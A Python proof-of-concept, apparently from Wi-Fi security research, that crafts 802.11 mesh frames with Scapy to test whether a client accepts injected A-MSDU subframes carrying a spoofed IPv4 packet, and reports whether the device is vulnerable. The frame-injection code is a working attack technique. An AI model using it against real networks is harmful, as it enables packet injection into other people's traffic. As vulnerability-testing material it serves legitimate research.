#!/usr/bin/env python3
import sys, subprocess, socket, select, argparse

from wpaspy import Ctrl
import time, subprocess
from libwifi import *

LABEL_AMSDU_ATTACK    = b"Simulated A-MSDU attack injection"
LABEL_NORMAL_MSDU     = b"Raw MSDU injection"
LABEL_NORMAL_AMSDU_1  = b"Raw A-MSDU injection #1"
LABEL_NORMAL_AMSDU_2  = b"Raw A-MSDU injection #2"

class Dot11MeshControl(Packet):
    name = "802.11 Mesh Control Field"
    fields_desc = [ ByteField("flags", 0),
                    ByteField("ttl", 0),
                    LEIntField("seqnum", 0)]

def create_msdu_subframe(src, dst, payload, last=False):
	# Exclude length of the 6-byte Mesh Control Field
	length = len(payload)
	if Dot11MeshControl in payload:
		length -= 6 + payload[Dot11MeshControl].flags * 6
	p = Ether(dst=dst, src=src, type=(length * 0x100))

	payload = raw(payload)

	total_length = len(p) + len(payload)
	padding = ""
	if not last and total_length % 4 != 0:
		padding = b"\x00" * (4 - (total_length % 4))

	return p / payload / Raw(padding)


def cleanup():
	if wpaspy_ctrl != None:
		wpaspy_ctrl.request("TERMINATE")
	if process != None:
		process.wait()



def test_normal_injection(key=None, addr_extension=0):
	# Optional sanity check when debugging:
	#sendp(Ether(src=STA2, dst=STA1)/IP()/UDP()/Raw(b"Eth injection sanity check"), iface=iface_attacker)

	if addr_extension == 0:
		mesh_flags = 0
		addr_extension_hdr = Raw(b"")
	elif addr_extension == 2:
		mesh_flags = 2
		addr_extension_hdr = Raw(addr2bin(STA1) + addr2bin(STA2))

	# TXOP here is actually "Mesh Control Present" flag
	p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
		/ Dot11QoS(TXOP=1) \
		/ Dot11MeshControl(ttl=0x1f, seqnum=6002, flags=mesh_flags) \
		/ addr_extension_hdr \
		/ LLC()/SNAP()/IP()/UDP()/Raw(LABEL_NORMAL_MSDU)

	if key == None:
		sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/p)
	else:
		enc = encrypt_ccmp(p, key, pn=10)
		print(enc)
		sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/enc)


	# TXOP here is actually "Mesh Control Present" flag
	p1 = Dot11MeshControl(ttl=0x1f, seqnum=6002, flags=mesh_flags) \
		/ addr_extension_hdr \
		/ LLC()/SNAP()/IP()/UDP()/Raw(LABEL_NORMAL_AMSDU_1)
	p2 = Dot11MeshControl(ttl=0x1f, seqnum=6003, flags=mesh_flags) \
		/ addr_extension_hdr \
		/ LLC()/SNAP()/IP()/UDP()/Raw(LABEL_NORMAL_AMSDU_2)
	p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(51 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
		/ Dot11QoS(A_MSDU_Present=1, TXOP=1) \
		/ create_msdu_subframe(STA2, STA1, p1, last=False) \
		/ create_msdu_subframe(STA2, STA1, p2, last=True)

	if key == None:
		sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/p)
	else:
		enc = encrypt_ccmp(p, key, pn=20)
		print(enc)
		sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/enc)


def simulate_attack_addr4(p1):
	# - Dot11QoS TXOP field here is actually "Mesh Control Present" flag
	# - The False conditions here are to debug the attack if needed
	if False:
		# This works
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002) 		\
			/ Raw(b"\xAA\xAA\x03\x00\x00\x00")/Raw(b"\x08\x00")/Raw(8 * b"\x00" + 6 * b"\x11") \
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1
	elif False:
		# This works - with a IPv4 header that starts with 0x45 the Mesh Control Field indicates that "Mesh Address Extension subfield contains Address 4"
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002) 		\
			/ Raw(b"\xAA\xAA\x03\x00\x00\x00")/Raw(b"\x08\x00")/Raw(b"\x45" + 7 * b"\x00" + 12 * b"\x11" + b"\x00\x00") \
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1
	elif True:
		# Now with full LLC/SNAP/IP header to show feasibility! This works!
		# Paper: "Since our crafted IPv4 packet has an IPv4 header of 20 bytes, and
		# 	  is preceded by a 6-byte Mesh Control and 8-byte rfc1042 field, the
		#         second A-MSDU subframe begins 2 bytes after the IPv4 header."
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002) 		\
			/ LLC()/SNAP()/IP()/Raw(b"\x00\x00")			\
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1

	return p


def simulate_attack_addr6(p1):
	# - The False conditions here are to debug the attack if needed
	if False:
		# paper: "If the Mesh Address Extension
		# 	  field is 12 bytes long, the length field of the first A-MSDU subframe
		# 	  equals the first two bytes of the end destination’s MAC address,
		#         meaning exploitability depends on the value of this address."
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002, flags=2) 	\
			/ Raw(b"\x00" * 6 + b"\x1C\x00" + b"\x00" * 4)		\
			/ Raw(b"\xAB\xAA\x03\x00\x00\x00")/Raw(b"\x08\x00")	\
			/ IP()/Raw(b"P" * 2)					\
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1
		#	/ Dot11MeshControl(ttl=0x1f, seqnum=6002, flags=2) 	\	# A-MSDU addr1
		#	/ Raw(b"\x00" * 6 + b"\x1C\x00" + b"\x00" * 4)		\	# A-MSDU addr2 + length + 4-bytes mesh control
		#	/ Raw(b"\xAA\xAA\x03\x00\x00\x00")/Raw(b"\x08\x00")	\	# 2-bytes mesh control + 8-bytes LLC/SNAP
		#	/ IP()/Raw(b"P" * 2)					\	# 20-byte IP address
		#	/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1
	elif True:
		p = Dot11(FCfield="to-DS+from-DS", type=2, SC=(5 << 4), subtype=8, addr1=STA1, addr2=STA2, addr3=STA1, addr4=STA2) \
			/ Dot11QoS(TXOP=1) 					\
			/ Dot11MeshControl(ttl=0x1f, seqnum=6002, flags=2) 	\
			/ Raw(b"\x00" * 6 + b"\x1C\x00" + b"\x00" * 4)		\
			/ LLC()/SNAP()						\
			/ IP()/Raw(b"P" * 2)					\
			/ Ether(dst=STA1, src=STA2, type=(len(p1) - 6)*0x100)/p1

	return p


def simulate_attack(key=None, addr_extension=0):
	p1 = Dot11MeshControl(ttl=0x1f, seqnum=6002) \
		/ LLC()/SNAP()/IP(src="1.2.3.4", dst="5.6.7.8")/UDP()/Raw(LABEL_AMSDU_ATTACK)

	if addr_extension == 0:
		p = simulate_attack_addr4(p1)
	elif addr_extension == 2:
		p = simulate_attack_addr6(p1)

	print("\n\n>>> Sending simulated attacker IPv4 single MSDU marked but marked as A-MSDU...\n\n")
	if key == None:
		p[Dot11QoS].A_MSDU_Present = 1
		sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/p)
	else:
		print("Plaintext:", repr(p))
		enc = encrypt_ccmp(p, key, pn=5)
		enc[Dot11QoS].A_MSDU_Present = 1
		print("Encrypted:", repr(enc))
		sendp(RadioTap(present="TXFlags", TXFlags="NOSEQ+ORDER")/enc)


def main():
	global process, wpaspy_ctrl
	process = None
	wpaspy_ctrl = None

	# Remove old occurrences of the control interface that didn't get cleaned properly
	subprocess.call(["rm", "-rf", "wpaspy_ctrl/"])

	# -W parameter makes wpa_supplicant pause on startup until we connect to control interface
	cmd = ["../wpa_supplicant/wpa_supplicant", "-Dnl80211", "-i", iface_attacker, "-c", "mesh1.conf", "-dd", "-K"]
	process = subprocess.Popen(cmd)
	time.sleep(1)
	atexit.register(cleanup)

	# Connect to the control interface
	wpaspy_ctrl = Ctrl("wpaspy_ctrl/" + iface_attacker)
	wpaspy_ctrl.attach()

	# Let wpa_supplicant run for 10 seconds and then exit
	time.sleep(2)

	while wpaspy_ctrl.pending():
		wpaspy_ctrl.recv()

	key = wpaspy_ctrl.request("GET tk")
	try:
		key = bytes.fromhex(key)
		print(">>> Got key", key.hex())
	except ValueError:
		key = None

	s = L2Socket(type=ETH_P_ALL, iface=iface_victim)

	if options.test_normal:
		test_normal_injection(key, 2 if options.six_addresses else 0)
	else:
		simulate_attack(key, 2 if options.six_addresses else 0)
	time.sleep(1)

	vulnerable = False
	normal_msdu = False
	normal_amsdu_1 = False
	normal_amsdu_2 = False
	while True:
		ready, _, _ = select.select([s], [], [], 0)
		if not ready:
			break

		data = s.recv()

		if LABEL_AMSDU_ATTACK in raw(data):
			ip = IP(raw(data)[14:])
			if ip.src == "1.2.3.4" and ip.dst == "5.6.7.8":
				vulnerable = True
		elif LABEL_NORMAL_MSDU in raw(data):
			normal_msdu = True
		elif LABEL_NORMAL_AMSDU_1 in raw(data):
			normal_amsdu_1 = True
		elif LABEL_NORMAL_AMSDU_2  in raw(data):
			normal_amsdu_2 = True

	print("\n\n")
	if vulnerable:
		print(">>> ATTACK WORKED! Received injected packet")
		print(repr(ip))
	if normal_msdu:
		print(">>> SUCCESS! Received normal MSDU packet")
	if normal_amsdu_1 and normal_amsdu_2:
		print(">>> SUCCESS! Received both A-MSDU subframes")

	if not vulnerable and not options.test_normal:
		print(">>> Couldn't detect injected packet. Client looks secure.")
	elif not vulnerable and not normal_msdu and not (normal_amsdu_1 and normal_amsdu_2):
		print(">>> Couldn't detect injected packet.")
	print("\n\n")


	time.sleep(5)


if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Test for Mesh vulnerabilities and normal frame Tx")
	parser.add_argument('nic_victim', help="Interface of the victim (to verify injection of frame)")
	parser.add_argument('nic_attacker', help="Interface of the attacker (simulates both client and MitM)")
	parser.add_argument('--test-normal', default=False, action='store_true', help="Test normal MSDU and A-MSDU packet Tx")
	parser.add_argument('--six-addresses', default=False, action='store_true', help="Perform the tests using 6 addresses (12-byte extension field)")
	options = parser.parse_args()

	iface_victim = options.nic_victim
	iface_attacker = options.nic_attacker
	iface_monitor  = add_virtual_monitor(iface_attacker)
	subprocess.check_output(["ifconfig", iface_monitor, "up"])

	conf.iface = iface_monitor

	STA1 = get_macaddress(iface_victim)
	STA2 = get_macaddress(iface_attacker)

	main()

